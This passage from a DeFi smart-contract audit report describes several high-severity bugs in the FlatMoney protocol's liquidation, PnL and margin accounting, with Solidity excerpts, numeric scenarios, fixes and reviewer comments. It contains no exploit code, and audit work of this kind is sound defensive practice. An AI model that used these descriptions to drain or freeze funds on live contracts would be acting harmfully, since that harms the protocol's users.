The `_fundingFees` funding fee at Line 228 above can be positive (gain by long traders) or negative (loss by long traders). 

Assume that the `_fundingFees` is `-20` (negative indicating a loss by long traders and a win for LP stakers) and the current `_globalPositions.marginDepositedTotal` is 10. 

When Line 232 above execute, the condition `(int256(_globalPositions.marginDepositedTotal) > _fundingFees)` equal to `(+10 > -20)` and evaluate to True.

Subseqently, Line 233 will be executed `uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)`, which lead to the following result:

```solidity
➜ uint256(int256(10) - 20)
Type: uint
├ Hex: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6
└ Decimal: 115792089237316195423570985008687907853269984665640564039457584007913129639926
```

An integer underflow due to unsafe casting has occurred, which results in `marginDepositedTotal` being set to a significantly large number (`115792089237316195423570985008687907853269984665640564039457584007913129639926`) and become significantly inflated.

The operation `int256(10) - 20` results in a negative value (-10). When casting `int256(-10)` to uint256, Instead of throwing an error, Solidity handles this underflow by wrapping the result to the maximum value that `uint256` can represent and then subtracts the deficit, which results in the above large number.

Note that Solidity does not automatically check for overflows or underflows when casting.

## Impact

The `marginDepositedTotal` is one of the most important states in the system, along with the `stableCollateralTotal`. It represents the total amount of margin deposited or owned by the long traders. The entire functioning of the protocol relies on the proper accounting of the `marginDepositedTotal`. If the `marginDepositedTotal` is incorrect, as shown in the above example, the protocol and the vault are effectively broken.

In addition, the `0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6` value in the `marginDepositedTotal` is already close to the max number supported by uint256. Thus, most operations such as opening/adjusting/closing position, funding fee settlement, or PnL accruing that increase the `_globalPositions.marginDepositedTotal` further will not work as it will result in an overflow. Since users cannot close their positions, that also means that their assets are stuck within the system.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L233

## Tool used

Manual Review

## Recommendation

Consider performing the calculation in `int256` and then checking if the result is positive before casting it back to `uint256`. If the result is negative or zero, you can set `_globalPositions.marginDepositedTotal` to 0.

```diff
+ int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _fundingFees;
// In the worst case scenario that the last position which remained open is underwater,
// we set the margin deposited total to 0. We don't want to have a negative margin deposited total.
- _globalPositions.marginDepositedTotal = (int256(_globalPositions.marginDepositedTotal) > _fundingFees)
+ _globalPositions.marginDepositedTotal = (newMarginDepositedTotal > 0)
-	? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)
+	? uint256(newMarginDepositedTotal)
	: 0;
```



## Discussion

**sherlock-admin**

3 comment(s) were left on this issue during the judging contest.

**karanctf** commented:
>  same as 78

**ubl4nk** commented:
> invalid -> this is a Low, marginDepositedTotal should be higher than 57896044618658097711785492504343953926634992332820282019728792003956564819967 for this scenario to happen, just Google it "int256 range"

**takarez** commented:
>  valid: high(2)



# Issue H-5: Inconsistent in the margin transferred to LP during liquidation when settledMargin < 0 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/182 

## Found by 
xiaoming90
## Summary

There is a discrepancy in the approach of computing the expected gain and loss per share within the `liquidate` and `_stableCollateralPerShareLiquidation` functions, which will lead to an unexpected revert during the liquidation process.

Liquidation is the core component of the protocol and is important to the solvency of the protocol. If the liquidation does not execute as intended, underwater positions and bad debt accumulate in the protocol, threatening the solvency of the protocol.

## Vulnerability Detail

At Line 109 below, the `settledMargin` is greater than 0, a portion (or all) of the margin will be sent to the liquidator and LPs. If the `settledMargin` is negative, the LPs will bear the cost of the underwater position's loss.

When the `liquidate` function is executed, the `liquidationInvariantChecks` modifier will be triggered to perform invariant checks before and after the execution.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

```solidity
File: LiquidationModule.sol
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
086:         FlatcoinStructs.Position memory position = vault.getPosition(tokenId);
087: 
088:         (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();
089: 
090:         // Settle funding fees accrued till now.
091:         vault.settleFundingFees();
092: 
093:         // Check if the position can indeed be liquidated.
094:         if (!canLiquidate(tokenId)) revert FlatcoinErrors.CannotLiquidate(tokenId);
095: 
096:         FlatcoinStructs.PositionSummary memory positionSummary = PerpMath._getPositionSummary(
097:             position,
098:             vault.cumulativeFundingRate(),
099:             currentPrice
100:         );
101: 
102:         // Check that the total margin deposited by the long traders is not -ve.
103:         // To get this amount, we will have to account for the PnL and funding fees accrued.
104:         int256 settledMargin = positionSummary.marginAfterSettlement;
105: 
106:         uint256 liquidatorFee;
107: 
108:         // If the settled margin is greater than 0, send a portion (or all) of the margin to the liquidator and LPs.
109:         if (settledMargin > 0) {
// Do something
138:         } else {
139:             // If the settled margin is -ve then the LPs have to bear the cost.
140:             // Adjust the stable collateral total to account for user's profit/loss and the negative margin.
141:             // Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).
142:             vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
143:         }
```

The `liquidationInvariantChecks` modifier will trigger the `_stableCollateralPerShareLiquidation` function internally. This function will compute the `expectedStableCollateralPerShare` based on the remaining margin (also called `settledMargin`), as shown in Line 130 below. 

Assume that the liquidated position's current `settledMargin` is -3 (marginDeposit=2, accruedFee=0, PnL=-5). 

In this case, at Line 142 above within the `liquidate` function, the expected gain or loss of the LP is computed via `settledMargin - positionSummary.profitLoss`, which is equal to +2 (-3 - (-5))

However, within the invariant check (`_stableCollateralPerShareLiquidation`) below, at Line 150 below, the expected gain or loss of the LP is computed only via the `settledMargin` (remaining margin), which is equal to -3.

Thus, there is a discrepancy in the approach of computing the expected gain and loss per share within the `liquidate` and `_stableCollateralPerShareLiquidation` functions, and the `expectedStableCollateralPerShare` computed will deviate from the actual gain/loss per share during liquidation, leading to an unexpected revert during the check at Line 152 below during the liquidation process.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/misc/InvariantChecks.sol#L118

```solidity
File: InvariantChecks.sol
118:     function _stableCollateralPerShareLiquidation(
119:         IStableModule stableModule,
120:         uint256 liquidationFee,
121:         int256 remainingMargin,
122:         uint256 stableCollateralPerShareBefore,
123:         uint256 stableCollateralPerShareAfter
124:     ) private view {
125:         uint256 totalSupply = stableModule.totalSupply();
126: 
127:         if (totalSupply == 0) return;
128: 
129:         int256 expectedStableCollateralPerShare;
130:         if (remainingMargin > 0) {
131:             if (remainingMargin > int256(liquidationFee)) {
132:                 // position is healthy and there is a keeper fee taken from the margin
133:                 // evaluate exact increase in stable collateral
134:                 expectedStableCollateralPerShare =
135:                     int256(stableCollateralPerShareBefore) +
136:                     (((remainingMargin - int256(liquidationFee)) * 1e18) / int256(stableModule.totalSupply()));
137:             } else {
138:                 // position has less or equal margin than liquidation fee
139:                 // all the margin will go to the keeper and no change in stable collateral
140:                 if (stableCollateralPerShareBefore != stableCollateralPerShareAfter)
141:                     revert FlatcoinErrors.InvariantViolation("stableCollateralPerShareLiquidation");
142: 
143:                 return;
144:             }
145:         } else {
146:             // position is underwater and there is no keeper fee
147:             // evaluate exact decrease in stable collateral
148:             expectedStableCollateralPerShare =
149:                 int256(stableCollateralPerShareBefore) +
150:                 ((remainingMargin * 1e18) / int256(stableModule.totalSupply()));
151:         }
152:         if (
153:             expectedStableCollateralPerShare + 1e6 < int256(stableCollateralPerShareAfter) || // rounding error
154:             expectedStableCollateralPerShare - 1e6 > int256(stableCollateralPerShareAfter)
155:         ) revert FlatcoinErrors.InvariantViolation("stableCollateralPerShareLiquidation");
156:     }
```

## Impact

Liquidation is the core component of the protocol and is important to the solvency of the protocol. If the liquidation does not execute as intended, such as in the scenario mentioned above where the invariant check will revert unexpectedly, underwater positions and bad debt accumulate in the protocol, threatening the solvency of the protocol.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/misc/InvariantChecks.sol#L118

## Tool used

Manual Review

## Recommendation

Ensure that the formula used to compute the expected `StableCollateralPerShare` during the invariant check is consistent with the formula used within the actual liquidation function.

```diff
// position is underwater and there is no keeper fee
// evaluate exact decrease in stable collateral
expectedStableCollateralPerShare =
    int256(stableCollateralPerShareBefore) +
-   ((remainingMargin * 1e18) / int256(stableModule.totalSupply()));
+	(((remainingMargin - positionSummary.profitLoss) * 1e18) / int256(stableModule.totalSupply()));    
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: there is a decrepancy that will cause the liquidation to revert; high(4)



# Issue H-6: Asymmetry in profit and loss (PnL) calculations 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/186 

## Found by 
KingNFT, chaduke, xiaoming90
## Summary

An asymmetry arises in profit and loss (PnL) calculations due to relative price changes. This discrepancy emerges when adjustments to a position lead to differing PnL outcomes despite equivalent absolute price shifts in rETH, leading to loss of assets.

## Vulnerability Detail

#### Scenario 1

Assume at $T0$, the price of rETH is \$1000. Bob opened a long position with the following state:

- Position Size = 40 ETH
- Margin = $x$ ETH

At $T2$, the price of rETH increased to \$2000. Thus, Bob's PnL is as follows: he gains 20 rETH.

```solidity
PnL = Position Size * Price Shift / Current Price
PnL = Position Size * (Current Price - Last Price) / Current Price
PnL = 40 rETH * ($2000 - $1000) / $2000
PnL = $40000 / $2000 = 20 rETH
```

Important Note: In terms of dollars, each ETH earns \$1000. Since the position held 40 ETH, the position gained \$40000.

#### Scenario 2

Assume at $T0$, the price of rETH is \$1000. Bob opened a long position with the following state:

- Position Size = 40 ETH
- Margin = $x$ ETH

At $T1$, the price of rETH dropped to \$500. An adjustment is executed against Bob's long position, and a `newMargin` is computed to account for the PnL accrued till now, as shown in Line 191 below. Thus, Bob's PnL is as follows: he lost 40 rETH.

```solidity
PnL = Position Size * Price Shift / Current Price
PnL = Position Size * (Current Price - Last Price) / Current Price
PnL = 40 rETH * ($500 - $1000) / $500
PnL = -$20000 / $500 = -40 rETH
```

At this point, the position's `marginDeposited` will be $(x - 40)\ rETH$ and `lastPrice` set to \$500.

Important Note 1: In terms of dollars, each ETH lost $500. Since the position held 40 ETH, the position lost \$20000

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L211

```solidity
File: LeverageModule.sol
190:         // This accounts for the profit loss and funding fees accrued till now.
191:         uint256 newMargin = (marginAdjustment +
192:             PerpMath
193:                 ._getPositionSummary({position: position, nextFundingEntry: cumulativeFunding, price: adjustPrice})
194:                 .marginAfterSettlement).toUint256();
..SNIP..
211:         vault.setPosition(
212:             FlatcoinStructs.Position({
213:                 lastPrice: adjustPrice,
214:                 marginDeposited: newMargin,
215:                 additionalSize: newAdditionalSize,
216:                 entryCumulativeFunding: cumulativeFunding
217:             }),
218:             announcedAdjust.tokenId
219:         );
```

At $T2$, the price of rETH increases from \$500 to \$2000. Thus, Bob's PnL is as follows:

```solidity
PnL = Position Size * Price Shift / Current Price
PnL = Position Size * (Current Price - Last Price) / Current Price
PnL = 40 rETH * ($2000 - $500) / $500
PnL = $60000 / $2000 = 30 rETH
```

At this point, the position's `marginDeposited` will be $(x - 40 + 30)\ rETH$, which is equal to $(x - 10)\ rETH$. This effectively means that Bob has lost 10 rETH of the total margin he deposited.

Important Note 2: In terms of dollars, each ETH gains $1500. Since the position held 40 ETH, the position gained \$60000.

Important Note 3: If we add up the loss of \$20000 at 𝑇1 and the gain of \$60000 at 𝑇2, the overall PnL is a gain of \$40000 at the end.

#### Analysis

The final PnL of a position should be equivalent regardless of the number of adjustments/position updates made between $T0$ and $T2$. However, the current implementation does not conform to this property. Bob gains 20 rETH in the first scenario, while Bob loses 10 rETH in the second scenario. 

There are several reasons that lead to this issue:

- The PnL calculation emphasizes relative price changes (percentage) rather than absolute price changes (dollar value). This leads to asymmetric rETH outcomes for the same absolute dollar gains/losses. If we have used the dollar to compute the PnL, both scenarios will return the same correct result, with a gain of $40000 at the end, as shown in the examples above. (Refer to the important note above)
- The formula for PnL calculation is sensitive to the proportion of the price change relative to the current price. This causes the rETH gains/losses to be non-linear even when the absolute dollar gains/losses are the same.

#### Extra Example

The current approach to computing the PnL will also cause issues in another area besides the one shown above. The following example aims to demonstrate that it can cause a desync between the PnL accumulated by the global positions AND the PnL of all the individual open positions in the system.

The following shows the two open positions owned by Alice and Bob. The current price of ETH is \$1000 and the current time is $T0$

| Alice's Long Position                             | Bob's Long Position                              |
| ------------------------------------------------- | ------------------------------------------------ |
| Position Size = 100 ETH<br />Entry Price = \$1000 | Position Size = 50 ETH<br />Entry Price = \$1000 |

At $T1$, the price of ETH drops from \$1000 to $750, and the `updateGlobalPositionData` function is executed. The `profitLossTotal` is computed as below. Thus, the `marginDepositedTotal` decreased by 50 ETH.

```solidity
priceShift = $750 - $1000 = -$250
profitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / price
profitLossTotal = (150 ETH * -$250) / $750 = -50 ETH
```

At $T2$, the price of ETH drops from \$750 to \$500, and the `updateGlobalPositionData` function is executed. The `profitLossTotal` is computed as below. Thus, the `marginDepositedTotal` decreased by 75 ETH.

```solidity
priceShift = $500 - $750 = -$250
profitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / price
profitLossTotal = (150 ETH * -$250) / $500 = -75 ETH
```

In total, the `marginDepositedTotal` decreased by 125 ETH (50 + 75), which means that the long traders lost 125 ETH from $T0$ to $T2$.

However, when we compute the loss of Alice and Bob's positions at $T2$, they lost a total of 150 ETH, which deviated from the loss of 125 ETH in the global position data.

```solidity
Alice's PNL
priceShift = current price - entry price = $500 - $1000 = -$500
PnL = (position size * priceShift) / current price
PnL = (100 ETH * -$500) / $500 = -100 ETH

Bob's PNL
priceShift = current price - entry price = $500 - $1000 = -$500
PnL = (position size * priceShift) / current price
PnL = (50 ETH * -$500) / $500 = -50 ETH
```

## Impact

Loss of assets, as demonstrated in the second scenario in the first example above. The tracking of profit and loss, which is the key component within the protocol, both on the position level and global level, is broken.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L211

## Tool used

Manual Review

## Recommendation

Consider tracking the PnL in dollar value/term to ensure consistency between the rETH and dollar representations of gains and losses.

#### Appendix

Compared to SNX V2, it is not vulnerable to this issue. The reason is that in SNX V2 when it computes the PnL, it does not "scale" down the result by the price. The PnL in SNXv2 is simply computed in dollar value ($positionSize \times priceShift$), while FlatCoin protocol computes in collateral (rETH) term ($\frac{positionSize \times priceShift}{price}$).

https://github.com/Synthetixio/synthetix/blob/1cfafd30deb4511cf885b4bc3cc4e9c970356800/contracts/PerpsV2MarketBase.sol#L261

```solidity
function _profitLoss(Position memory position, uint price) internal pure returns (int pnl) {
    int priceShift = int(price).sub(int(position.lastPrice));
    return int(position.size).multiplyDecimal(priceShift);
}
```

https://github.com/Synthetixio/synthetix/blob/1cfafd30deb4511cf885b4bc3cc4e9c970356800/contracts/PerpsV2MarketBase.sol#L278

```solidity
/*
 * The initial margin of a position, plus any PnL and funding it has accrued. The resulting value may be negative.
 */
function _marginPlusProfitFunding(Position memory position, uint price) internal view returns (int) {
    int funding = _accruedFunding(position, price);
    return int(position.margin).add(_profitLoss(position, price)).add(funding);
}
```



## Discussion

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.

# Issue H-7: Incorrect price used when updating the global position data 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/188 

## Found by 
0xLogos, 0xVolodya, juan, nobody2018, santipu\_, xiaoming90
## Summary

Incorrect price used when updating the global position data leading to a loss of assets for LPs.

## Vulnerability Detail

Near the end of the liquidation process, the `updateGlobalPositionData` function at Line 159 will be executed to update the global position data. However, when executing the `updateGlobalPositionData` function, the code sets the price at Line 160 below to the position's last price (`position.lastPrice`), which is incorrect. The price should be set to the current price instead, and not the position's last price.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L160

```solidity
File: LiquidationModule.sol
082:     /// @notice Function to liquidate a position.
083:     /// @dev One could directly call this method instead of `liquidate(uint256, bytes[])` if they don't want to update the Pyth price.
084:     /// @param tokenId The token ID of the leverage position.
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
086:         FlatcoinStructs.Position memory position = vault.getPosition(tokenId);
087: 
088:         (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();
089: 
090:         // Settle funding fees accrued till now.
091:         vault.settleFundingFees();
092: 
093:         // Check if the position can indeed be liquidated.
094:         if (!canLiquidate(tokenId)) revert FlatcoinErrors.CannotLiquidate(tokenId);
095: 
096:         FlatcoinStructs.PositionSummary memory positionSummary = PerpMath._getPositionSummary(
097:             position,
098:             vault.cumulativeFundingRate(),
099:             currentPrice
100:         );
..SNIP..
159:         vault.updateGlobalPositionData({
160:             price: position.lastPrice,
161:             marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
162:             additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.
163:         });
```

The reason why the `updateGlobalPositionData` function expects a current price to be passed in is that within the `PerpMath._profitLossTotal` function, it will compute the price shift between the current price and the last price to obtain the PnL of all the open positions. Also, per the comment at Line 170 below, it expects the current price of the collateral to be passed in.

Thus, it is incorrect to pass in the individual position's last/entry price, which is usually the price of the collateral when the position was first opened or adjusted some time ago.

Thus, if the last/entry price of the liquidated position is higher than the current price of collateral, the PnL will be inflated, indicating more gain for the long traders. Since this is a zero-sum game, this also means that the LP loses more assets than expected due to the inflated gain of the long traders.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

```solidity
File: FlatcoinVault.sol
168:     /// @notice Function to update the global position data.
169:     /// @dev This function is only callable by the authorized modules.
170:     /// @param _price The current price of the underlying asset.
171:     /// @param _marginDelta The change in the margin deposited total.
172:     /// @param _additionalSizeDelta The change in the size opened total.
173:     function updateGlobalPositionData(
174:         uint256 _price,
175:         int256 _marginDelta,
176:         int256 _additionalSizeDelta
177:     ) external onlyAuthorizedModule {
178:         // Get the total profit loss and update the margin deposited total.
179:         int256 profitLossTotal = PerpMath._profitLossTotal({globalPosition: _globalPositions, price: _price});
180: 
181:         // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.
182:         // However, since the funding fees are settled at the same time as the global position data is updated,
183:         // we can ignore the funding fees here.
184:         int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;
185: 
186:         // Check that the sum of margin of all the leverage traders is not negative.
187:         // Rounding errors shouldn't result in a negative margin deposited total given that
188:         // we are rounding down the profit loss of the position.
189:         // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.
190:         // The margin may be negative if liquidations are not happening in a timely manner.
191:         if (newMarginDepositedTotal < 0) {
192:             revert FlatcoinErrors.InsufficientGlobalMargin();
193:         }
194: 
195:         _globalPositions = FlatcoinStructs.GlobalPositions({
196:             marginDepositedTotal: uint256(newMarginDepositedTotal),
197:             sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
198:             lastPrice: _price
199:         });
```

## Impact

Loss of assets for the LP as mentioned in the above section.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L160

## Tool used

Manual Review

## Recommendation

Use the current price instead of liquidated position's last price when update the global position data

```diff
(uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();
..SNIP..
vault.updateGlobalPositionData({
-    price: position.lastPrice,
+    price: currentPrice,    
    marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
    additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.
});
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(1)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/264.

# Issue H-8: Liquidation will result in an underflow revert 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/192 

## Found by 
xiaoming90
## Summary

Liquidation will result in an underflow revert. Liquidation is the core component of the protocol and is important to the solvency of the protocol. If the liquidation cannot be executed due to the revert described in the above scenario, underwater positions and bad debt will accumulate in the protocol, threatening the solvency of the protocol.

In addition, the proper function of the protocol relies on the correct accounting of the collateral in the vault and collateral owned by long traders and LPs. If the accounting is off, the vault will be broken.

## Vulnerability Detail

At $T0$, the current price of ETH is \$1000 and assume the following state:

| Alice's Long Position 1                                     | Bob's Long Position 2                                       | Charles (LP)     |
| ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------- |
| Position Size = 6 ETH<br />Margin = 3 ETH<br />Last Price (entry price) = \$1000 | Position Size = 6 ETH<br />Margin = 5 ETH<br />Last Price (entry price) = \$1000 | Deposited 12 ETH |

- The `stableCollateralTotal` will be 12 ETH
- The `GlobalPositions.marginDepositedTotal` will be 8 ETH (3 + 5)
- The `globalPosition.sizeOpenedTotal` will be 12 ETH (6 + 6)
- The total balance of ETH in the vault is 20 ETH. 

As this is a perfectly hedged market, the accrued fee will be zero, and ignored in this report for simplicity's sake.

At $T1$, the price of the ETH drops from \$1000 to \$600. At this point, the settle margin of both long positions will be as follows:

| Alice's Long Position 1                                     | Bob's Long Position 2                                       |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| priceShift = Current Price - Last Price = \$600 - \$1000 = -\$400<br />PnL = (Position Size * priceShift) / Current Price = (6 ETH * -\$400) / \$400 = -4 ETH<br />settleMargin = marginDeposited + PnL = 3 ETH + (-4 ETH) = -1 ETH | PnL = -4 ETH (Same calculation)<br />settleMargin = marginDeposited + PnL = 5 ETH + (-4 ETH) = 1 ETH |

Alice's long position is underwater (settleMargin < 0), so it can be liquidated. 

Since the liquidated position's settledMargin is less than 0, the code at Line 142 below will be executed.

```solidity
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal((3 ETH + (-4 ETH)) - (-4 ETH)); // This effectively remove the PnL component from the equation
vault.updateStableCollateralTotal(3 ETH);
```

After the `updateStableCollateralTotal` function is executed, the `stableCollateralTotal` will become 15 ETH (12 + 3), the `GlobalPositions.marginDepositedTotal` will remain at 8 ETH, and the total balance of ETH in the vault will remain at 20 ETH.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

```solidity
File: LiquidationModule.sol
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
..SNIP..
109:         if (settledMargin > 0) {
..SNIP..
138:         } else {
139:             // If the settled margin is -ve then the LPs have to bear the cost.
140:             // Adjust the stable collateral total to account for user's profit/loss and the negative margin.
141:             // Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).
142:             vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
143:         }
..SNIP..
159:         vault.updateGlobalPositionData({
160:             price: position.lastPrice,
161:             marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
162:             additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.
163:         });
```

Subsequently, the `vault.updateGlobalPositionData` will be executed. The `marginDelta` will be set to -3 ETH, as shown below:

```solidity
marginDelta = -(position.marginDeposited + positionSummary.accruedFunding)
marginDelta = -(3 ETH + 0)
marginDelta = -3 ETH
```

Line 179 below within the `updateGlobalPositionData` function will compute the total PnL of all the opened long positions.

```solidity
priceShift = current price - last price
priceShift = $600 - $1000 = -$400

profitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / current price
profitLossTotal = (12 ETH * -$400) / $600
profitLossTotal = -8 ETH
```

At Line 184 below, the `newMarginDepositedTotal` will be set to as follows:

```solidity
newMarginDepositedTotal = _globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal
newMarginDepositedTotal = 8 ETH + (-3 ETH) + (-8 ETH) = -3 ETH
```

As `newMarginDepositedTotal` is less than zero, the code at Line 192 will trigger a revert, causing the liquidation TX to revert.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

```solidity
File: FlatcoinVault.sol
168:     /// @notice Function to update the global position data.
169:     /// @dev This function is only callable by the authorized modules.
170:     /// @param _price The current price of the underlying asset.
171:     /// @param _marginDelta The change in the margin deposited total.
172:     /// @param _additionalSizeDelta The change in the size opened total.
173:     function updateGlobalPositionData(
174:         uint256 _price,
175:         int256 _marginDelta,
176:         int256 _additionalSizeDelta
177:     ) external onlyAuthorizedModule {
178:         // Get the total profit loss and update the margin deposited total.
179:         int256 profitLossTotal = PerpMath._profitLossTotal({globalPosition: _globalPositions, price: _price});
180: 
181:         // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.
182:         // However, since the funding fees are settled at the same time as the global position data is updated,
183:         // we can ignore the funding fees here.
184:         int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;
185: 
186:         // Check that the sum of margin of all the leverage traders is not negative.
187:         // Rounding errors shouldn't result in a negative margin deposited total given that
188:         // we are rounding down the profit loss of the position.
189:         // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.
190:         // The margin may be negative if liquidations are not happening in a timely manner.
191:         if (newMarginDepositedTotal < 0) {
192:             revert FlatcoinErrors.InsufficientGlobalMargin();
193:         }
194: 
195:         _globalPositions = FlatcoinStructs.GlobalPositions({
196:             marginDepositedTotal: uint256(newMarginDepositedTotal),
197:             sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
198:             lastPrice: _price
199:         });
200: 
201:         // Profit loss of leverage traders has to be accounted for by adjusting the stable collateral total.
202:         // Note that technically, even the funding fees should be accounted for when computing the stable collateral total.
203:         // However, since the funding fees are settled at the same time as the global position data is updated,
204:         // we can ignore the funding fees here
205:         _updateStableCollateralTotal(-profitLossTotal);
206:     }
```

Let's assume that there is no revert for the sake of verifying the correctness of the accounting used in the later portion of the code within the liquidation function.

In this case, the latest `marginDepositedTotal` will be set to -3 ETH. 

Next, the `_updateStableCollateralTotal(-profitLossTotal);` at Line 205 above will be executed, and the `stableCollateralTotal` will be set to 23 ETH.

```solidity
stableCollateralTotal = stableCollateralTotal + (-profitLossTotal)
stableCollateralTotal = 15 ETH + (-(-8 ETH))
stableCollateralTotal = 15 ETH + (8 ETH)
stableCollateralTotal = 23 ETH
```

This shows that accounting is incorrect, as it is not possible for the LPs to own 23 ETH when there are only 20 ETH balance as collateral in the vault.

In conclusion, there are two (2) issues identified here:

1. Liquidation cannot be carried out due to revert
2. Even if there is no revert, the accounting of collateral is off.

## Impact

Liquidation is the core component of the protocol and is important to the solvency of the protocol. If the liquidation cannot be executed due to the revert described in the above scenario, underwater positions and bad debt will accumulate in the protocol, threatening the solvency of the protocol.

In addition, the proper function of the protocol relies on the correct accounting of the collateral in the vault and collateral owned by long traders and LPs. If the accounting is off, the vault will be broken.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

## Tool used

Manual Review

## Recommendation

In the above scenario, to prevent an underflow revert when computing the new `newMarginDepositedTotal` and fixing the incorrect balance issue, the `profitLossTotal` should be excluded within the `updateGlobalPositionData` function during liquidation. 

```diff
- profitLossTotal = PerpMath._profitLossTotal(...)

- newMarginDepositedTotal = globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal
+ newMarginDepositedTotal = globalPositions.marginDepositedTotal + _marginDelta

if (newMarginDepositedTotal < 0) {
    revert FlatcoinErrors.InsufficientGlobalMargin();
}

_globalPositions = FlatcoinStructs.GlobalPositions({
    marginDepositedTotal: uint256(newMarginDepositedTotal),
    sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
    lastPrice: _price
});
        
- _updateStableCollateralTotal(-profitLossTotal);
```

The existing `updateGlobalPositionData` function still needs to be used for other functions besides liquidation. As such, consider creating a separate new function (e.g., updateGlobalPositionDataDuringLiquidation) solely for use during the liquidation that includes the above fixes.

**Verification of solution**

Let's verify if the fixes work as intended using the same example in the report.

The following means that the Initial Deposited Margin (3 ETH) of Alice's position is being transferred to the LPs.

```solidity
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal((3 ETH + (-4 ETH)) - (-4 ETH)); // This effectively remove the PnL component from the equation
vault.updateStableCollateralTotal(3 ETH);
```

After the `updateStableCollateralTotal` function is executed, the `stableCollateralTotal` will become 15 ETH (12 + 3), the `GlobalPositions.marginDepositedTotal` will remain at 8 ETH, and the total balance of ETH in the vault will remain at 20 ETH.

The same values as the earlier example, except that the formula has changed. The `newMarginDepositedTotal` is left with 5 ETH, which is correct because this represents the ETH margin deposited by Bob's existing position in the system.

```solidity
newMarginDepositedTotal = _globalPositions.marginDepositedTotal + _marginDelta
newMarginDepositedTotal = 8 ETH + (-3 ETH) = 5 ETH
```

The `newMarginDepositedTotal` is above 0, so there is no revert, which is good.

```solidity
stableCollateralTotal = stableCollateralTotal + 0
stableCollateralTotal = 15 ETH (No change, remain the same)
```

